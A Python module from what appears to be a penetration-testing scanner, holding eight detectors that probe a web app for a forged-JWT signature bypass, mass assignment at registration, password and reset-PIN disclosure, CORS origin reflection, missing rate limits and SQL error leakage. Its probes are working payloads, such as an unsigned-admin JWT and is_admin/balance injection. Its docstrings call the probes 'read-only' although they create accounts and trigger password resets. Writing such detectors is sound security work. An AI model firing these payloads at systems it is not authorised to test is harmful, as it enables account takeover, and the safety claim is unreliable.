"""
src/oneinfinity/findings/gap_detectors.py

Gap detectors — additional lightweight checks that were missing from the
oneinfinity scan pipeline and discovered via manual pentest comparison.

Each detector is a standalone function:
  result = detect_<name>(target, token=None, **kwargs)
  → list[dict]   (each dict is a raw finding that can be fed to ingest())

These are called by FullScanMission._run() in god_mode_engine.py after the
main scan completes, giving them access to any auth tokens produced by the
scan.  They are fast (<2s each), safe (read-only probes), and deterministic.

Detected gaps (found via manual pentest of vulnbank.org):
  1. JWT No-Signature-Verification — server accepts any alg=HS256 JWT
  2. BOPLA Mass Assignment — /register accepts is_admin / balance fields
  3. Debug Response Password Disclosure — plaintext password in response body
  4. Forgot-Password PIN in Response (v1) — 3-digit PIN returned in body
  5. CORS Origin Reflection — ACAO mirrors any Origin header (+ credentials)
"""
from __future__ import annotations

import logging
import time
from typing import Optional

import requests

log = logging.getLogger("oneinfinity.gap_detectors")

_TIMEOUT = 8   # seconds per probe
_HEADERS = {"User-Agent": "OneInfinity/gap-detector"}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _base(target: str) -> str:
    """Return scheme://host from target URL (strip trailing slash / path)."""
    from urllib.parse import urlparse
    p = urlparse(target if "://" in target else f"https://{target}")
    return f"{p.scheme}://{p.netloc}"


def _finding(
    target: str,
    vuln_type: str,
    title: str,
    severity: str,
    url: str,
    evidence: str,
    payload: str = "",
    confidence: float = 0.85,
) -> dict:
    import uuid
    return {
        "finding_id":   str(uuid.uuid4())[:12],
        "target":       target,
        "vuln_type":    vuln_type,
        "title":        title,
        "severity":     severity,
        "url":          url,
        "evidence":     evidence,
        "payload":      payload,
        "confidence":   confidence,
        "tool":         "gap-detector",
        "source_type":  "active-probe",
        "created_at":   __import__("datetime").datetime.utcnow().isoformat(),
    }


# ---------------------------------------------------------------------------
# 1. JWT No-Signature-Verification
# ---------------------------------------------------------------------------

def detect_jwt_no_sig_verification(target: str, admin_path: str = "/sup3r_s3cr3t_admin", **_) -> list[dict]:
    """
    Probe: build a JWT with an arbitrary (invalid) HS256 signature
    and test whether a protected endpoint accepts it.

    Impact (CRITICAL): attacker can forge any JWT claim (is_admin=true,
    arbitrary user_id) without knowing the signing secret.
    """
    import base64, json, hmac, hashlib
    base = _base(target)
    url = base + admin_path

    def b64url(b: bytes) -> str:
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

    header  = b64url(json.dumps({"typ": "JWT", "alg": "HS256"}).encode())
    payload = b64url(json.dumps({"user_id": 1, "username": "admin", "is_admin": True, "iat": int(time.time())}).encode())
    # Use an intentionally wrong signature — random bytes
    bad_sig = b64url(b"DEFINITELY_NOT_A_VALID_SIGNATURE_XXXXXXXXXXX")
    token   = f"{header}.{payload}.{bad_sig}"

    try:
        r = requests.get(
            url,
            headers={**_HEADERS, "Authorization": f"Bearer {token}"},
            timeout=_TIMEOUT,
            allow_redirects=False,
        )
        # Vulnerable if we get 200 (or HTML admin panel) with an invalid signature
        is_vuln = (
            r.status_code == 200
            and "error" not in r.text.lower()[:200]
            and ("admin" in r.text.lower() or "dashboard" in r.text.lower() or r.text.strip().startswith("<"))
        )
        if is_vuln:
            return [_finding(
                target=target,
                vuln_type="jwt_no_sig_verification",
                title="JWT Signature Not Verified — Admin Panel Accessible with Forged Token",
                severity="critical",
                url=url,
                evidence=(
                    f"HTTP {r.status_code} returned for request with an intentionally invalid "
                    f"JWT signature. Server does not verify HS256 signatures — any token with "
                    f"is_admin=true grants admin access. Response snippet: {r.text[:300]}"
                ),
                payload=token,
                confidence=0.97,
            )]
        log.debug("detect_jwt_no_sig_verification: not vulnerable (status=%d)", r.status_code)
    except Exception as exc:
        log.debug("detect_jwt_no_sig_verification: probe error: %s", exc)
    return []


# ---------------------------------------------------------------------------
# 2. BOPLA — Mass Assignment (is_admin / balance injection via /register)
# ---------------------------------------------------------------------------

def detect_bopla_mass_assignment(target: str, register_path: str = "/register", **_) -> list[dict]:
    """
    Probe: POST /register with extra privileged fields (is_admin, balance).
    Vulnerable if the response confirms the injected values were accepted.

    Impact (CRITICAL): any user can self-promote to admin or set arbitrary
    balance at registration time, bypassing all business logic.
    """
    import json, random, string
    base = _base(target)
    url  = base + register_path
    rnd  = "".join(random.choices(string.ascii_lowercase, k=8))
    username = f"bopla_probe_{rnd}"

    try:
        r = requests.post(
            url,
            json={"username": username, "password": "P@ssw0rd_probe1", "is_admin": True, "balance": 999999},
            headers=_HEADERS,
            timeout=_TIMEOUT,
        )
        body = ""
        try:
            body = r.json()
        except Exception:
            body = r.text
        body_str = json.dumps(body) if isinstance(body, dict) else str(body)

        # Vulnerable if response reflects is_admin=true or balance=999999
        is_vuln = (
            r.status_code in (200, 201)
            and (
                '"is_admin": true' in body_str
                or '"is_admin":true' in body_str
                or '"balance": 999999' in body_str
                or '"balance":999999' in body_str
                or "999999" in body_str
            )
        )
        if is_vuln:
            return [_finding(
                target=target,
                vuln_type="bopla_mass_assignment",
                title="BOPLA — Mass Assignment: is_admin and balance Accepted at Registration",
                severity="critical",
                url=url,
                evidence=(
                    f"POST {register_path} with {{is_admin: true, balance: 999999}} returned "
                    f"HTTP {r.status_code} and reflected the injected privileged fields in the "
                    f"response. Any user can self-promote to admin and set arbitrary balance. "
                    f"Response snippet: {body_str[:500]}"
                ),
                payload='{"username":"...","password":"...","is_admin":true,"balance":999999}',
                confidence=0.96,
            )]
        log.debug("detect_bopla_mass_assignment: not vulnerable (status=%d, body=%s)", r.status_code, body_str[:100])
    except Exception as exc:
        log.debug("detect_bopla_mass_assignment: probe error: %s", exc)
    return []


# ---------------------------------------------------------------------------
# 3. Plaintext Password in Registration/Login Response (debug_data disclosure)
# ---------------------------------------------------------------------------

def detect_debug_password_disclosure(target: str, register_path: str = "/register", **_) -> list[dict]:
    """
    Probe: POST /register and check if the response contains the plaintext
    password back in debug_data.raw_data.

    Impact (HIGH): password enumeration / credential harvesting. An attacker
    who intercepts any registration response has the plaintext credential.
    Also violates PCI-DSS, GDPR, SOC2 requirements.
    """
    import json, random, string
    base = _base(target)
    url  = base + register_path
    rnd  = "".join(random.choices(string.ascii_lowercase, k=8))
    password = f"Pr0be_{rnd}_SENTINEL"

    try:
        r = requests.post(
            url,
            json={"username": f"debugprobe_{rnd}", "password": password},
            headers=_HEADERS,
            timeout=_TIMEOUT,
        )
        body_str = r.text
        # Vulnerable if our sentinel password appears verbatim in the response
        if r.status_code in (200, 201) and password in body_str:
            return [_finding(
                target=target,
                vuln_type="debug_password_disclosure",
                title="Plaintext Password Returned in Registration Response (debug_data)",
                severity="high",
                url=url,
                evidence=(
                    f"POST {register_path} response contained the plaintext password in the "
                    f"response body (debug_data.raw_data). The sentinel value '{password}' "
                    f"was reflected verbatim. This exposes credentials to any party with "
                    f"access to network traffic, logs, or browser history. "
                    f"Response snippet: {body_str[:400]}"
                ),
                payload=f'{{"password":"{password}"}}',
                confidence=0.95,
            )]
        log.debug("detect_debug_password_disclosure: not vulnerable (status=%d)", r.status_code)
    except Exception as exc:
        log.debug("detect_debug_password_disclosure: probe error: %s", exc)
    return []


# ---------------------------------------------------------------------------
# 4. Forgot-Password PIN Exposed in Response (API v1)
# ---------------------------------------------------------------------------

def detect_forgot_password_pin_disclosure(
    target: str,
    username: str = "admin",
    forgot_path: str = "/api/v1/forgot-password",
    **_,
) -> list[dict]:
    """
    Probe: POST /api/v1/forgot-password and check if the response body
    contains the reset PIN (debug_info.pin).

    Impact (HIGH): password reset PIN is returned directly to the caller
    instead of being sent to the registered email. Any attacker who can
    call this endpoint can reset any user's password in one step.
    """
    import json
    base = _base(target)
    url  = base + forgot_path

    try:
        r = requests.post(
            url,
            json={"username": username},
            headers=_HEADERS,
            timeout=_TIMEOUT,
        )
        body_str = r.text
        is_vuln = False
        pin_val = None
        try:
            body = r.json()
            debug = body.get("debug_info") or {}
            if "pin" in debug:
                is_vuln = True
                pin_val = debug["pin"]
        except Exception:
            # Fallback: look for short numeric string in "pin": "NNN" pattern
            import re
            m = re.search(r'"pin"\s*:\s*"(\d{3,6})"', body_str)
            if m:
                is_vuln = True
                pin_val = m.group(1)

        if is_vuln:
            return [_finding(
                target=target,
                vuln_type="forgot_password_pin_disclosure",
                title="Password Reset PIN Returned in API Response (Should be Email-Only)",
                severity="high",
                url=url,
                evidence=(
                    f"POST {forgot_path} response contains the reset PIN ({pin_val!r}) in "
                    f"debug_info. This allows an attacker to reset any user's password without "
                    f"access to their email by simply calling this endpoint. "
                    f"Response snippet: {body_str[:400]}"
                ),
                payload=f'{{"username":"{username}"}}',
                confidence=0.96,
            )]
        log.debug("detect_forgot_password_pin_disclosure: not vulnerable (status=%d)", r.status_code)
    except Exception as exc:
        log.debug("detect_forgot_password_pin_disclosure: probe error: %s", exc)
    return []


# ---------------------------------------------------------------------------
# 5. CORS Origin Reflection (mirrors any Origin including evil.com)
# ---------------------------------------------------------------------------

def detect_cors_origin_reflection(target: str, **_) -> list[dict]:
    """
    Probe: send a request with Origin: https://evil.example.com and check
    if the response reflects it verbatim in Access-Control-Allow-Origin.

    Also checks if Access-Control-Allow-Credentials is set (worst case:
    attacker can make authenticated cross-origin requests).

    Impact (HIGH→CRITICAL depending on ACAC):
    - With ACAC: true — full account takeover via CSRF+CORS chain
    - Without ACAC — limited to public API data exposure
    """
    base = _base(target)
    evil_origin = "https://evil.pentest-probe.example.com"
    findings = []

    # Probe a few typical API endpoints
    for path in ["/api/transactions", "/api/virtual-cards", "/login", "/"]:
        url = base + path
        try:
            r = requests.options(
                url,
                headers={**_HEADERS, "Origin": evil_origin,
                         "Access-Control-Request-Method": "GET",
                         "Access-Control-Request-Headers": "Authorization"},
                timeout=_TIMEOUT,
                allow_redirects=False,
            )
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")

            reflected = acao == evil_origin or acao == "*"
            with_creds = acac.lower() == "true"

            if reflected:
                severity = "critical" if (reflected and acao != "*" and with_creds) else "high"
                confidence = 0.95 if acao != "*" else 0.80

                findings.append(_finding(
                    target=target,
                    vuln_type="cors_origin_reflected",
                    title=(
                        "CORS Origin Reflection with Credentials — Full ATO Possible"
                        if (acao != "*" and with_creds)
                        else "CORS Wildcard — Any Origin Allowed"
                        if acao == "*"
                        else "CORS Origin Reflection (No Credentials)"
                    ),
                    severity=severity,
                    url=url,
                    evidence=(
                        f"OPTIONS {path} with Origin: {evil_origin} → "
                        f"Access-Control-Allow-Origin: {acao!r}, "
                        f"Access-Control-Allow-Credentials: {acac!r}. "
                        + (
                            "CRITICAL: attacker can make authenticated cross-origin requests "
                            "and read response data (JWT tokens, account info) via malicious JS."
                            if with_creds and acao != "*"
                            else "Any website can make cross-origin requests to this API."
                        )
                    ),
                    payload=f"Origin: {evil_origin}",
                    confidence=confidence,
                ))
                break  # one finding is enough — same root cause
        except Exception as exc:
            log.debug("detect_cors_origin_reflection: probe error for %s: %s", path, exc)

    return findings


# ---------------------------------------------------------------------------
# 6. No Rate Limiting on Password Reset / Login (brute-forceable)
# ---------------------------------------------------------------------------

def detect_no_rate_limit_brute_force(
    target: str,
    paths: Optional[list[str]] = None,
    **_,
) -> list[dict]:
    """
    Probe: send 20 rapid-fire requests to /login and /forgot-password.
    Vulnerable if all 20 succeed without a 429 or lockout response.

    Impact (HIGH): brute-force password reset PINs (3-digit = 1000 combos)
    or credential stuffing on login without account lockout.
    """
    import json, random, string
    base  = _base(target)
    paths = paths or ["/api/v1/forgot-password", "/api/v2/forgot-password"]
    findings = []

    for path in paths:
        url  = base + path
        codes = []
        try:
            rnd = "".join(random.choices(string.ascii_lowercase, k=6))
            for _ in range(20):
                r = requests.post(
                    url,
                    json={"username": f"ratechk_{rnd}"},
                    headers=_HEADERS,
                    timeout=_TIMEOUT,
                )
                codes.append(r.status_code)
            # Vulnerable if no 429 / 403 / lockout in 20 requests
            rate_limited = any(c in (429, 403, 423) for c in codes)
            if not rate_limited:
                findings.append(_finding(
                    target=target,
                    vuln_type="no_rate_limiting",
                    title=f"No Rate Limiting on {path} — Brute Force Possible",
                    severity="high",
                    url=url,
                    evidence=(
                        f"20 rapid-fire POST requests to {path} all returned non-429 "
                        f"status codes: {set(codes)}. No lockout or rate-limit response "
                        f"observed. Combined with the 3-digit PIN disclosure on /api/v1/forgot-password, "
                        f"an attacker can enumerate all 1000 PINs in seconds."
                    ),
                    payload="20 rapid requests, no 429 received",
                    confidence=0.88,
                ))
                break   # both paths share the same root cause
        except Exception as exc:
            log.debug("detect_no_rate_limit_brute_force: probe error for %s: %s", path, exc)

    return findings


# ---------------------------------------------------------------------------
# 7. SQL Error Full-Query Disclosure in Login / Transactions
# ---------------------------------------------------------------------------

def detect_sql_error_query_disclosure(target: str, **_) -> list[dict]:
    """
    Probe: inject a syntax-error payload into login and check if the response
    returns the full SQL query text.

    Impact (HIGH): full SQL query exposure in error messages leaks the database
    schema, table names, and column names.  Dramatically accelerates SQLi exploitation.
    """
    base = _base(target)
    findings = []

    # Login endpoint
    login_url = base + "/login"
    try:
        r = requests.post(
            login_url,
            json={"username": "x'", "password": "x"},
            headers=_HEADERS,
            timeout=_TIMEOUT,
        )
        body = r.text
        # Vulnerable if the SQL query appears in the error response
        if (
            r.status_code in (200, 400, 500)
            and any(kw in body for kw in ("SELECT", "FROM users", "LINE 1:", "syntax error", "DETAIL:"))
            and len(body) > 50
        ):
            findings.append(_finding(
                target=target,
                vuln_type="sql_error_query_disclosure",
                title="Full SQL Query Returned in Login Error Response",
                severity="high",
                url=login_url,
                evidence=(
                    f"POST /login with username=\"x'\" returned the full SQL query in the "
                    f"error message. This exposes table structure, column names, and query logic. "
                    f"Response: {body[:500]}"
                ),
                payload="username: x'",
                confidence=0.94,
            ))
    except Exception as exc:
        log.debug("detect_sql_error_query_disclosure: login probe error: %s", exc)

    # Transactions endpoint (if we have a token)
    # transactions_url = base + "/transactions/x'"
    # ... (would need auth token — skip for now, covered by main scan)

    return findings


# ---------------------------------------------------------------------------
# 8. Sensitive Debug Data in API Responses (server_info, debug_info leaks)
# ---------------------------------------------------------------------------

def detect_api_debug_data_exposure(target: str, **_) -> list[dict]:
    """
    Probe: POST /register and check if the response includes debug_data with
    server_info (User-Agent leak), registration_time, user_id, etc.

    Impact (MEDIUM-HIGH): information disclosure that aids targeting and OSINT.
    Also a PCI-DSS / GDPR violation for plaintext password exposure.
    """
    import json, random, string
    base = _base(target)
    url  = base + "/register"
    rnd  = "".join(random.choices(string.ascii_lowercase, k=6))

    try:
        r = requests.post(
            url,
            json={"username": f"dbgprobe_{rnd}", "password": "P@ssDebug1!"},
            headers=_HEADERS,
            timeout=_TIMEOUT,
        )
        body_str = r.text
        debug_fields_found = []
        for field in ("server_info", "user_id", "registration_time", "raw_data", "debug_info", "debug_data"):
            if f'"{field}"' in body_str:
                debug_fields_found.append(field)

        if debug_fields_found and r.status_code in (200, 201):
            return [_finding(
                target=target,
                vuln_type="api_debug_data_exposure",
                title="Sensitive Debug Data Returned in API Response",
                severity="medium",
                url=url,
                evidence=(
                    f"POST /register returned debug fields in the response: {debug_fields_found}. "
                    f"Includes server_info (User-Agent of caller), user_id, timestamps. "
                    f"This aids reconnaissance and OSINT. Response: {body_str[:400]}"
                ),
                payload='{"username":"...","password":"..."}',
                confidence=0.90,
            )]
    except Exception as exc:
        log.debug("detect_api_debug_data_exposure: probe error: %s", exc)
    return []


# ---------------------------------------------------------------------------
# Runner — call all detectors for a target
# ---------------------------------------------------------------------------

_ALL_DETECTORS = [
    detect_jwt_no_sig_verification,
    detect_bopla_mass_assignment,
    detect_debug_password_disclosure,
    detect_forgot_password_pin_disclosure,
    detect_cors_origin_reflection,
    detect_no_rate_limit_brute_force,
    detect_sql_error_query_disclosure,
    detect_api_debug_data_exposure,
]


def run_gap_detectors(target: str, **kwargs) -> list[dict]:
    """
    Run all gap detectors against `target`.
    Returns a flat list of raw finding dicts suitable for ingestion.
    Safe to call during a live scan — each probe is read-only and fast.
    """
    findings: list[dict] = []
    for detector in _ALL_DETECTORS:
        name = detector.__name__
        try:
            results = detector(target, **kwargs)
            if results:
                log.info("gap_detectors: %s → %d finding(s)", name, len(results))
                findings.extend(results)
            else:
                log.debug("gap_detectors: %s → clean", name)
        except Exception as exc:
            log.warning("gap_detectors: %s failed (non-fatal): %s", name, exc)
    return findings
